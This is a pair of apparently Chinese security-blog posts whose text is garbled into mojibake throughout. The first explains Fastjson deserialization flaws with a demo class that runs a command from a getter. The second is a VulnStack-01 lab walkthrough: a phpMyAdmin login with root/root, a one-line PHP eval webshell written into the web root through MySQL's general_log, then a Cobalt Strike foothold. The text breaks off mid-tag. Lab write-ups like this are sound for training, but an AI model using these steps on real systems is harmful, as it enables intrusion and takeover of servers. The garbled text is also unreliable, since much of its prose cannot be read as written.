ÊºèÊ¥ûÂéüÁêÜ</h3><p>Áî±ÂâçÈù¢Áü•ÈÅìÔºåFastjsonÊòØËá™Â∑±ÂÆûÁé∞ÁöÑ‰∏ÄÂ•óÂ∫èÂàóÂåñÂíåÂèçÂ∫èÂàóÂåñÊú∫Âà∂Ôºå‰∏çÊòØÁî®ÁöÑJavaÂéüÁîüÁöÑÂ∫èÂàóÂåñÂíåÂèçÂ∫èÂàóÂåñÊú∫Âà∂„ÄÇÊó†ËÆ∫ÊòØÂì™‰∏™ÁâàÊú¨ÔºåFastjsonÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÁöÑÂéüÁêÜÈÉΩÊòØ‰∏ÄÊ†∑ÁöÑÔºåÂè™‰∏çËøá‰∏çÂêåÁâàÊú¨ÊòØÈíàÂØπ‰∏çÂêåÁöÑÈªëÂêçÂçïÊàñËÄÖÂà©Áî®‰∏çÂêåÂà©Áî®ÈìæÊù•ËøõË°åÁªïËøáÂà©Áî®ËÄåÂ∑≤„ÄÇ</p><p>ÈÄöËøáFastjsonÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÔºåÊîªÂáªËÄÖÂèØ‰ª•‰º†ÂÖ•‰∏Ä‰∏™ÊÅ∂ÊÑèÊûÑÈÄ†ÁöÑJSONÂÜÖÂÆπÔºåÁ®ãÂ∫èÂØπÂÖ∂ËøõË°åÂèçÂ∫èÂàóÂåñÂêéÂæóÂà∞ÊÅ∂ÊÑèÁ±ªÂπ∂ÊâßË°å‰∫ÜÊÅ∂ÊÑèÁ±ª‰∏≠ÁöÑÊÅ∂ÊÑèÂáΩÊï∞ÔºåËøõËÄåÂØºËá¥‰ª£Á†ÅÊâßË°å„ÄÇ</p><h4 id="ÈÇ£‰πàÂ¶Ç‰ΩïÊâçËÉΩÂ§üÂèçÂ∫èÂàóÂåñÂá∫ÊÅ∂ÊÑèÁ±ªÂë¢Ôºü"><a href="#ÈÇ£‰πàÂ¶Ç‰ΩïÊâçËÉΩÂ§üÂèçÂ∫èÂàóÂåñÂá∫ÊÅ∂ÊÑèÁ±ªÂë¢Ôºü" class="headerlink" title="ÈÇ£‰πàÂ¶Ç‰ΩïÊâçËÉΩÂ§üÂèçÂ∫èÂàóÂåñÂá∫ÊÅ∂ÊÑèÁ±ªÂë¢Ôºü"></a>ÈÇ£‰πàÂ¶Ç‰ΩïÊâçËÉΩÂ§üÂèçÂ∫èÂàóÂåñÂá∫ÊÅ∂ÊÑèÁ±ªÂë¢Ôºü</h4><p>Áî±ÂâçÈù¢demoÁü•ÈÅìÔºåFastjson‰ΩøÁî®<code>parseObject()</code>&#x2F;<code>parse()</code>ËøõË°åÂèçÂ∫èÂàóÂåñÁöÑÊó∂ÂÄôÂèØ‰ª•ÊåáÂÆöÁ±ªÂûã„ÄÇÂ¶ÇÊûúÊåáÂÆöÁöÑÁ±ªÂûãÂ§™Â§ßÔºåÂåÖÂê´Â§™Â§öÂ≠êÁ±ªÔºåÂ∞±ÊúâÂà©Áî®Á©∫Èó¥‰∫Ü„ÄÇ‰æãÂ¶ÇÔºåÂ¶ÇÊûúÊåáÂÆöÁ±ªÂûã‰∏∫ObjectÊàñJSONObjectÔºåÂàôÂèØ‰ª•ÂèçÂ∫èÂàóÂåñÂá∫Êù•‰ªªÊÑèÁ±ª„ÄÇ‰æãÂ¶Ç‰ª£Á†ÅÂÜô<code>Object o = JSON.parseObject(poc,Object.class)</code>Â∞±ÂèØ‰ª•ÂèçÂ∫èÂàóÂåñÂá∫ObjectÁ±ªÊàñÂÖ∂‰ªªÊÑèÂ≠êÁ±ªÔºåËÄåObjectÂèàÊòØ‰ªªÊÑèÁ±ªÁöÑÁà∂Á±ªÔºåÊâÄ‰ª•Â∞±ÂèØ‰ª•ÂèçÂ∫èÂàóÂåñÂá∫ÊâÄÊúâÁ±ª„ÄÇ</p><h4 id="Êé•ÁùÄÔºåÂ¶Ç‰ΩïÊâçËÉΩËß¶ÂèëÂèçÂ∫èÂàóÂåñÂæóÂà∞ÁöÑÊÅ∂ÊÑèÁ±ª‰∏≠ÁöÑÊÅ∂ÊÑèÂáΩÊï∞Âë¢Ôºü"><a href="#Êé•ÁùÄÔºåÂ¶Ç‰ΩïÊâçËÉΩËß¶ÂèëÂèçÂ∫èÂàóÂåñÂæóÂà∞ÁöÑÊÅ∂ÊÑèÁ±ª‰∏≠ÁöÑÊÅ∂ÊÑèÂáΩÊï∞Âë¢Ôºü" class="headerlink" title="Êé•ÁùÄÔºåÂ¶Ç‰ΩïÊâçËÉΩËß¶ÂèëÂèçÂ∫èÂàóÂåñÂæóÂà∞ÁöÑÊÅ∂ÊÑèÁ±ª‰∏≠ÁöÑÊÅ∂ÊÑèÂáΩÊï∞Âë¢Ôºü"></a>Êé•ÁùÄÔºåÂ¶Ç‰ΩïÊâçËÉΩËß¶ÂèëÂèçÂ∫èÂàóÂåñÂæóÂà∞ÁöÑÊÅ∂ÊÑèÁ±ª‰∏≠ÁöÑÊÅ∂ÊÑèÂáΩÊï∞Âë¢Ôºü</h4><p>Áî±ÂâçÈù¢Áü•ÈÅìÔºåÂú®Êüê‰∫õÊÉÖÂÜµ‰∏ãËøõË°åÂèçÂ∫èÂàóÂåñÊó∂‰ºöÂ∞ÜÂèçÂ∫èÂàóÂåñÂæóÂà∞ÁöÑÁ±ªÁöÑÊûÑÈÄ†ÂáΩÊï∞„ÄÅ<code>getter</code>ÊñπÊ≥ï„ÄÅ<code>setter</code>ÊñπÊ≥ïÊâßË°å‰∏ÄÈÅçÔºåÂ¶ÇÊûúËøô‰∏âÁßçÊñπÊ≥ï‰∏≠Â≠òÂú®Âç±Èô©Êìç‰ΩúÔºåÂàôÂèØËÉΩÂØºËá¥ÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÁöÑÂ≠òÂú®„ÄÇÊç¢Âè•ËØùËØ¥ÔºåÂ∞±ÊòØÊîªÂáªËÄÖ‰º†ÂÖ•Ë¶ÅËøõË°åÂèçÂ∫èÂàóÂåñÁöÑÁ±ª‰∏≠ÁöÑÊûÑÈÄ†ÂáΩÊï∞„ÄÅ<code>getter</code>ÊñπÊ≥ï„ÄÅ<code>setter</code>ÊñπÊ≥ï‰∏≠Ë¶ÅÂ≠òÂú®ÊºèÊ¥ûÊâçËÉΩËß¶Âèë„ÄÇ</p><p>Êàë‰ª¨Âà∞<code>DefaultJSONParser.parseObject(Map object, Object fieldName)</code>‰∏≠Áúã‰∏ãÔºåJSON‰∏≠‰ª•@typeÂΩ¢Âºè‰º†ÂÖ•ÁöÑÁ±ªÁöÑÊó∂ÂÄôÔºåË∞ÉÁî®<code>deserializer.deserialize()</code>Â§ÑÁêÜËØ•Á±ªÔºåÂπ∂ÂéªË∞ÉÁî®Ëøô‰∏™Á±ªÁöÑ<code>setter</code>Âíå<code>getter</code>ÊñπÊ≥ïÔºö</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title function_">parseObject</span><span class="params">(<span class="keyword">final</span> Map object, Object fieldName)</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// JSON.DEFAULT_TYPE_KEYÂç≥@type</span></span><br><span class="line">    <span class="keyword">if</span> (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="type">ObjectDeserializer</span> <span class="variable">deserializer</span> <span class="operator">=</span> config.getDeserializer(clazz);</span><br><span class="line">        <span class="keyword">return</span> deserializer.deserialze(<span class="built_in">this</span>, clazz, fieldName);</span><br></pre></td></tr></table></figure><p>Êï¥‰∏™Ëß£ÊûêËøáÁ®ãÁõ∏ÂΩìÂ§çÊùÇÔºåÁü•ÈÅìÁªìËÆ∫Â∞±ok‰∫Ü„ÄÇ</p><h4 id="Â∞èÁªì‰∏Ä‰∏ã"><a href="#Â∞èÁªì‰∏Ä‰∏ã" class="headerlink" title="Â∞èÁªì‰∏Ä‰∏ã"></a>Â∞èÁªì‰∏Ä‰∏ã</h4><p>Ëã•ÂèçÂ∫èÂàóÂåñÊåáÂÆöÁ±ªÂûãÁöÑÁ±ªÂ¶Ç<code>Student obj = JSON.parseObject(text, Student.class);</code>ÔºåËØ•Á±ªÊú¨Ë∫´ÁöÑÊûÑÈÄ†ÂáΩÊï∞„ÄÅ<code>setter</code>ÊñπÊ≥ï„ÄÅ<code>getter</code>ÊñπÊ≥ïÂ≠òÂú®Âç±Èô©Êìç‰ΩúÔºåÂàôÂ≠òÂú®FastjsonÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÔºõ</p><p>Ëã•ÂèçÂ∫èÂàóÂåñÊú™ÊåáÂÆöÁ±ªÂûãÁöÑÁ±ªÂ¶Ç<code>Object obj = JSON.parseObject(text, Object.class);</code>ÔºåËØ•Ëã•ËØ•Á±ªÁöÑÂ≠êÁ±ªÁöÑÊûÑÈÄ†ÊñπÊ≥ï„ÄÅ<code>setter</code>ÊñπÊ≥ï„ÄÅ<code>getter</code>ÊñπÊ≥ïÂ≠òÂú®Âç±Èô©Êìç‰ΩúÔºåÂàôÂ≠òÂú®FastjsonÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÔºõ</p><h3 id="2-PoC-ÂÜôÊ≥ï"><a href="#2-PoC-ÂÜôÊ≥ï" class="headerlink" title="2. PoC ÂÜôÊ≥ï"></a>2. PoC ÂÜôÊ≥ï</h3><p>‰∏ÄËà¨ÁöÑÔºåFastjsonÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÁöÑPoCÂÜôÊ≥ïÂ¶Ç‰∏ãÔºå@typeÊåáÂÆö‰∫ÜÂèçÂ∫èÂàóÂåñÁöÑÁ±ª</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;@type&quot;</span>:<span class="string">&quot;xxx.xxx.xxx&quot;</span>,</span><br><span class="line"><span class="string">&quot;xxx&quot;</span>:<span class="string">&quot;xxx&quot;</span>,</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÂÖ≥ÈîÆÊòØË¶ÅÊâæÂá∫‰∏Ä‰∏™ÁâπÊÆäÁöÑÂú®ÁõÆÊ†áÁéØÂ¢É‰∏≠Â∑≤Â≠òÂú®ÁöÑÁ±ªÔºåÊª°Ë∂≥Â¶Ç‰∏ã‰∏§‰∏™Êù°‰ª∂Ôºö</p><ol><li>ËØ•Á±ªÁöÑÊûÑÈÄ†ÂáΩÊï∞„ÄÅ<code>setter</code>ÊñπÊ≥ï„ÄÅ<code>getter</code>ÊñπÊ≥ï‰∏≠ÁöÑÊüê‰∏Ä‰∏™Â≠òÂú®Âç±Èô©Êìç‰ΩúÔºåÊØîÂ¶ÇÈÄ†ÊàêÂëΩ‰ª§ÊâßË°åÔºõ</li><li>ÂèØ‰ª•ÊéßÂà∂ËØ•ÊºèÊ¥ûÂáΩÊï∞ÁöÑÂèòÈáèÔºà‰∏ÄËà¨Â∞±ÊòØËØ•Á±ªÁöÑÂ±ûÊÄßÔºâÔºõ</li></ol><h3 id="3-ÊºèÊ¥ûDemo"><a href="#3-ÊºèÊ¥ûDemo" class="headerlink" title="3. ÊºèÊ¥ûDemo"></a>3. ÊºèÊ¥ûDemo</h3><p>Áî±ÂâçÈù¢ÊØîËæÉÁöÑÊ°à‰æãÁü•ÈÅìÔºåÂΩìÂèçÂ∫èÂàóÂåñÊåáÂÆöÁöÑÁ±ªÂûãÊòØObject.classÔºåÂç≥‰ª£Á†Å‰∏∫<code>Object obj = JSON.parseObject(jsonstring, Object.class, Feature.SupportNonPublicField);</code>Êó∂ÔºåÂèçÂ∫èÂàóÂåñÂæóÂà∞ÁöÑÁ±ªÁöÑÊûÑÈÄ†ÂáΩÊï∞„ÄÅÊâÄÊúâÂ±ûÊÄßÁöÑ<code>setter</code>ÊñπÊ≥ï„ÄÅpropertiesÁßÅÊúâÂ±ûÊÄßÁöÑ<code>getter</code>ÊñπÊ≥ïÈÉΩ‰ºöË¢´Ë∞ÉÁî®ÔºåÂõ†Ê≠§Êàë‰ª¨ËøôÈáåÁõ¥Êé•ÂÅöÊúÄÁÆÄÂçïÁöÑ‰øÆÊîπÔºåÂ∞ÜStudentÁ±ª‰∏≠‰ºöË¢´Ë∞ÉÁî®ÁöÑ<code>getter</code>ÊñπÊ≥ïÊ∑ªÂä†ÊºèÊ¥û‰ª£Á†ÅÔºåËøôÈáå‰øÆÊîπ<code>getProperties()</code>‰Ωú‰∏∫ÊºîÁ§∫Ôºö</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Dome;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.util.Properties;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> String name;  </span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;  </span><br><span class="line">    <span class="keyword">private</span> String address;  </span><br><span class="line">    <span class="keyword">private</span> Properties properties;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;ÊûÑÈÄ†ÂáΩÊï∞&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> name;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);  </span><br><span class="line">        <span class="built_in">this</span>.name = name;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> age;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getAddress</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getAddress&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> address;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> Properties <span class="title function_">getProperties</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getProperties&quot;</span>);  </span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> properties;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÁÑ∂ÂêéËøôÈáåÁõ¥Êé•Êñ∞Âª∫‰∏Ä‰∏™ÂèçÂ∫èÂàóÁöÑ‰ª£Á†ÅÁî®Êù•Ëß¶ÂèëÊºèÊ¥û</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Dome;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonEasyPoC</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Dome.Student\&quot;,\&quot;age\&quot;:6,\&quot;name\&quot;:\&quot;y0n3er\&quot;,\&quot;address\&quot;:\&quot;china\&quot;,\&quot;properties\&quot;:&#123;&#125;&#125;&quot;</span>;  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonString, Object.class);  </span><br><span class="line">        System.out.println(obj);  </span><br><span class="line">        System.out.println(obj.getClass().getName());  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091126066.png" alt="image-20230809112658404"><br>ÂæàÊòéÊòæÔºåÂâçÈù¢ÁöÑDemo‰∏≠ÂèçÂ∫èÂàóÂåñÁöÑÁ±ªÊòØ‰∏Ä‰∏™ObjectÁ±ªÔºåËØ•Á±ªÊòØ‰ªªÊÑèÁ±ªÁöÑÁà∂Á±ªÔºåÂÖ∂Â≠êÁ±ªStudentÂ≠òÂú®FastjsonÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÔºåÂΩì@typeÊåáÂêëStudentÁ±ªÊòØÂèçÂ∫èÂàóÂåñÂ∞±‰ºöËß¶ÂèëÊºèÊ¥û„ÄÇ</p><p>ÂØπ‰∫éÂè¶‰∏ÄÁßçÂèçÂ∫èÂàóÂåñÊåáÂÆöÁ±ªÁöÑÊÉÖÊôØÔºåÊòØËØ•ÊåáÂÆöÁ±ªÊú¨Ë∫´Â∞±Â≠òÂú®ÊºèÊ¥ûÔºåÊØîÂ¶ÇÊàë‰ª¨Â∞Ü‰∏äËø∞Demo‰∏≠ÂèçÂ∫èÂàóÂåñÈÇ£Ë°å‰ª£Á†ÅÊîπÊàêÁõ¥Êé•ÂèçÂ∫èÂàóÂåñÂæóÂà∞StudentÁ±ªËÄåÈùûObjectÁ±ªÔºåËøôÊ†∑Â∞±ÊòØÂè¶‰∏Ä‰∏™Ëß¶Âèë‰πüÊòØÊúÄÁõ¥Êé•ÁöÑËß¶ÂèëÂú∫ÊôØÔºö</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Student</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonstring, Student.class, Feature.SupportNonPublicField);</span><br></pre></td></tr></table></figure><h3 id="4-Ë∞ÉËØïÂàÜÊûêÊºèÊ¥û"><a href="#4-Ë∞ÉËØïÂàÜÊûêÊºèÊ¥û" class="headerlink" title="4. Ë∞ÉËØïÂàÜÊûêÊºèÊ¥û"></a>4. Ë∞ÉËØïÂàÜÊûêÊºèÊ¥û</h3><p>debug‰∏Ä‰∏ãÁúãÁúãÂÜÖÈÉ®ËøêË°åÈÄªËæë<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091127569.png" alt="image-20230809112714870"><br>ÊúÄÁªà‰ºöÂú®Êñ≠ÁÇπËøô‰∏™ÂëΩ‰ª§ÊâßË°åÔºåÂΩìÁÑ∂Â¶ÇÊûúÊÉ≥Ë∑üÁöÑÊõ¥Ê∑±‰πüÂèØ‰ª•ÁªßÁª≠ËøõÂÖ•Ëøô‰∏™ÊñπÊ≥ïË∑ü</p><h2 id="Â∞èÁªì"><a href="#Â∞èÁªì" class="headerlink" title="Â∞èÁªì"></a>Â∞èÁªì</h2><p>Âà∞ËøôÈáåÊÑüËßâËøò‰∏çÁÆóÈöæÔºåÂ∞±ÊòØÂà©Áî®@typeÊåáÂÆöÁ±ªÂéªËá™Âä®ÊâßË°åÊûÑÈÄ†ÂáΩÊï∞Âíå<code>setter</code>ÊàñËÄÖ<code>getter</code>ÊñπÊ≥ï</p><h2 id="ÂèÇËÄÉ"><a href="#ÂèÇËÄÉ" class="headerlink" title="ÂèÇËÄÉ"></a>ÂèÇËÄÉ</h2><p><a href="https://drun1baby.top/2022/08/04/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8701-Fastjson%E5%9F%BA%E7%A1%80/">JavaÂèçÂ∫èÂàóÂåñFastjsonÁØá01-FastJsonÂü∫Á°Ä | Drunkbaby‚Äôs Blog (drun1baby.top)</a><br><a href="https://johnfrod.top/%e5%ae%89%e5%85%a8/fastjson%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e1-%e5%9f%ba%e6%9c%ac%e5%8e%9f%e7%90%86/">FastjsonÂèçÂ∫èÂàóÂåñÊºèÊ¥û(1)‚Äî‚ÄîÂü∫Êú¨ÂéüÁêÜ ‚Äì JohnFrod‚Äôs Blog</a><br><a href="https://www.bilibili.com/video/BV1bD4y117Qh/?spm_id_from=333.999.0.0&amp;vd_source=fdbccecc8d1a39a2449860e47c52b6e7">https://www.bilibili.com/video/BV1bD4y117Qh/?spm_id_from=333.999.0.0&amp;vd_source=fdbccecc8d1a39a2449860e47c52b6e7</a></p>]]></content>
      
      
      <categories>
          
          <category> JavaÂÆâÂÖ® </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>VulnStack--01</title>
      <link href="/2023/08/VulnStack-01/"/>
      <url>/2023/08/VulnStack-01/</url>
      
        <content type="html"><![CDATA[<h2 id="ÁéØÂ¢ÉÊê≠Âª∫"><a href="#ÁéØÂ¢ÉÊê≠Âª∫" class="headerlink" title="ÁéØÂ¢ÉÊê≠Âª∫"></a>ÁéØÂ¢ÉÊê≠Âª∫</h2><p>win7ÈúÄË¶ÅÈÄöÂ§ñÁΩëÔºåÊâÄ‰ª•ÈúÄË¶Å‰∏§Âº†ÁΩëÂç°ÔºåÁÑ∂Âêéwin7ÈúÄË¶ÅpingÈÄökali„ÄÅwin2003„ÄÅwin2008<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091138708.png" alt="image-20230809113543512"><br>ÁÑ∂ÂêéÂºÄÂêØwin7ÁöÑPHPstudyÂ∞±Ë°å‰∫ÜÔºå‰ΩÜÊòØËøôÈáåÊúâ‰∏™ÂæàÁñëÊÉëÁöÑÁÇπÂ∞±ÊòØwin7ÂèØ‰ª•pingÈÄöÂÖ∂ÂÆÉÁöÑÊú∫Âô®Ôºå‰ΩÜÊòØÂèçËøáÊù•Â∞±ping‰∏çÈÄöÂæàÂ•áÊÄ™ÔºåËÆøÈóÆwebÊúçÂä°ÂèàÊòØÊ≠£Â∏∏ÁöÑ„ÄÇ„ÄÇ„ÄÇ</p><h2 id="Â§ñÁΩëÊ∏óÈÄè"><a href="#Â§ñÁΩëÊ∏óÈÄè" class="headerlink" title="Â§ñÁΩëÊ∏óÈÄè"></a>Â§ñÁΩëÊ∏óÈÄè</h2><p>nmapÂÖàÊâ´‰∏ÄÊ≥¢<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091138114.png" alt="image-20230809113835029"><br>ÂºÄÊîæ‰∫Ü80Âíå3306Á´ØÂè£ÔºåÂÖàÂéªÁúãÁúã80ÔºåÊòØ‰∏Ä‰∏™phpÊé¢ÈíàÔºåMySQLÊ£ÄÊµãÈÇ£ÈáåÁõ¥Êé•Â∞ùËØïroot&#x2F;rootËøûÊé•ÊàêÂäü<br>Êé•ÁùÄÁõ¥Êé•ËÆøÈóÆphpmyadminÂà©Áî®Âº±Âè£‰ª§ÁôªÂΩïÊàêÂäüÔºåÁΩë‰∏äÁúã‰∫ÜÁúãËøô‰∏™ÁâàÊú¨ÂèØ‰ª•Âà©Áî®Êó•ÂøógetshellÔºåÊü•ÁúãÊó•ÂøóÊòØÂê¶ÂºÄÂêØ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;general_log&#x27;;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091138753.png" alt="image-20230809113854721"><br>Êú™ÂºÄÂêØÔºåÈÇ£‰πàÁõ¥Êé•ÂºÄÂêØÂÆÉ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log=on;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091139731.png" alt="image-20230809113910701"><br>Êõ¥ÊîπÊó•ÂøóÊñá‰ª∂Ë∑ØÂæÑÔºåÂàõÂª∫Êó•ÂøóÊñá‰ª∂ÔºåËøô‰∏™Ë∑ØÂæÑÂ∞±Ë°å‰ªéPHPÊé¢ÈíàÈÇ£ÈáåÂæóÂà∞ÁöÑ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log_file=&#x27;C:\\phpStudy\\WWW\\shell.php&#x27;;</span><br></pre></td></tr></table></figure><p>ÁÑ∂ÂêéÂæÄÊó•ÂøóÊñá‰ª∂ÂÜôÂÖ•‰∏ÄÂè•ËØùÊú®È©¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;&lt;?php @eval($_POST[cmd]);?&gt;&#x27;;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091139044.png" alt="image-20230809113921993"><br>ËöÅÂâëËøûÊé•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091139718.png" alt="image-20230809113933689"><br>ÊàêÂäüËøûÊé•ÔºåÂ§ñÁΩëÁªìÊùüÔºåÁÑ∂ÂêéËøôÈáåÈÄöËøáyxcms‰πüÊòØÂèØ‰ª•getshell</p><h2 id="ÂÜÖÁΩëÊ∏óÈÄè"><a href="#ÂÜÖÁΩëÊ∏óÈÄè" class="headerlink" title="ÂÜÖÁΩëÊ∏óÈÄè"></a>ÂÜÖÁΩëÊ∏óÈÄè</h2><p>Ê≤°ÊÄé‰πàÊé•Ëß¶ËøáÂÜÖÁΩëÂ≠¶‰π†‰∏Ä‰∏ã„ÄÇ„ÄÇ„ÄÇ</p><h3 id="CSÊãøshell"><a href="#CSÊãøshell" class="headerlink" title="CSÊãøshell"></a>CSÊãøshell</h3><p>WindowsÊ∏óÈÄèËøôÈáåÁõ¥Êé•‰∏äÁ∫øcsÔºåÁî±‰∫éÂ∑≤ÁªèÊúâ‰∫ÜwebÁöÑshellÔºåÊâÄ‰ª•Â∞±ÂèØ‰ª•Âà©Áî®powershellÂΩ¢ÂºèÁöÑstagerÁõ¥Êé•ÊâßË°åÂëΩ‰ª§Â∞±Â•Ω‰∫ÜÔºåÁî±‰∫éÁ¨¨‰∏ÄÊ¨°‰ΩøÁî®csÊâÄ‰ª•Âú®‰ΩøÁî®ÊñπÊ≥ïËÆ∞ÂΩïËØ¶ÁªÜÁÇπ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091139851.png" alt="image-20230809113943811"><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091139908.png" alt="image-20230809113955865"><br>ËøôÈáå‰∏çËÉΩ‰ΩøÁî®x64payloadÂê¶Âàô‰ºöÂ§±Ë¥•ÔºåÁÑ∂ÂêéËöÅÂâëÊâßË°åÁîüÊàêÁöÑpayloadÂç≥ÂèØÊàêÂäü‰∏äÁ∫ø<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091140898.png" 